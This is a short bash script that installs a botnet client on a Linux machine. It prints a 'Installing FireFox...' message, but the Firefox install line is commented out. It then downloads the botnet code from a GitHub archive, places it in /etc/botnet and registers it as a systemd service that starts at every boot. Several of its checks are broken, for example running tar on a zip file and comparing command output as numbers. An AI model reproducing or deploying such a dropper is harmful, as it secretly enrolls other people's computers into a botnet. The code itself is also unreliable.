#!/bin/bash


# Create the service allowing the bot to start on computer startup
createService() {
    filename="botnet.service"
    dest="/etc/systemd/system/$filename"

    echo "[Unit]" > $filename
    echo "After=multi-user.target" >> $filename
    echo -e "\n[Service]" >> $filename
    echo "Type=simple" >> $filename
    echo "WorkingDirectory=$(pwd)" >> $filename
    echo "ExecStart=python3 /etc/botnet/app.py" >> $filename
    echo "Restart=on-abort" >> $filename
    echo -e "\n[Install]" >> $filename
    echo "WantedBy=multi-user.target" >> $filename

    echo "Service file created successfully."
    

    if [ "$(sudo mv $filename $dest)" -eq 0 ]
    then
        sudo systemctl daemon-reload
        sudo systemctl enable $filename
        sudo systemctl start $filename
        echo "Service installed and started successfully !"
    else
        echo "Unable to move file ppserver.service into $dest, please retry as sudo"
    fi
}

# URL to download the botnet
botnet_url="https://github.com/Ninjeneer/botnet-client/archive/refs/heads/master.zip"
# Name of the downloaded file
filename="master.zip"
# Botnet destination
botnet_dest="/etc/botnet"

echo "Installing FireFox..."
# sudo apt install firefox

# Move to the /tmp folder to download and extract the botnet
cd /tmp || exit
wget $botnet_url
tar -xvf $filename
rm $filename

# Check if python already exists
is_python=$(which python3)
if [  "$is_python" -ne 0 ]
then
    # If it does'nt, install it
    sudo apt install python3
else
    echo "Already python"
fi

# Check if the python pip module is installed
is_pip=$(python3 -m pip)
if [ "$is_pip" -ne 0 ]
then
    # If it doesn't, install it
    echo "Pip does't exists, installing..."
    sudo apt install python3-pip
else
    echo "Pip already exist"
fi

# Move the botnet to the final destination
mv botnet-client-master $botnet_dest
cd $botnet_dest || exit
# Install the required modules
python3 -m pip install -r requirements.txt

# Create the service to start the botnet
createService